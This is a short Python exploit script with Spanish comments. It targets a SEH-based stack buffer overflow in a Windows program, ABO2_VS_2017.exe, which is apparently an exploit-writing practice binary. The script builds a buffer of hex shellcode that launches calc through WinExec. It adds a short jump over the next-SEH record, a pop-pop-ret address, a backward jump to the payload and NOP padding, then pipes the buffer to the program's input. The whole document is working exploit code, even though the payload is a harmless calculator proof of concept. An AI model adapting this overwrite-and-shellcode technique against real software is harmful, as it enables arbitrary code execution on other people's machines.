import sys
import binascii
from subprocess import Popen, PIPE


winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

size_crash = 0xE6
size_to_next_seh = 0x438
next_seh = b"\xEB\x06\x90\x90"      # Un JMP para evitar pisar el seh 
current_seh = b"\x31\x12\x40\x00"   # Salta al pop pop ret
jmp_to_payload = b"\xE9\xBB\xFB\xFF\xFF\x90" # Salta al payload
jmp_to_exit = b"\xE9\xB1\x14\x26\x00\x90"  # JMP 40102C

buffer =  winexec_calc_shellcode 
buffer += jmp_to_exit + b"\x90" * (size_to_next_seh - len(winexec_calc_shellcode) - len(jmp_to_exit))
buffer += next_seh
buffer += current_seh
buffer += jmp_to_payload
buffer += b"\x90" * size_crash # Size para de desbordar la pila

payload = buffer

p1 = Popen("ABO2_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()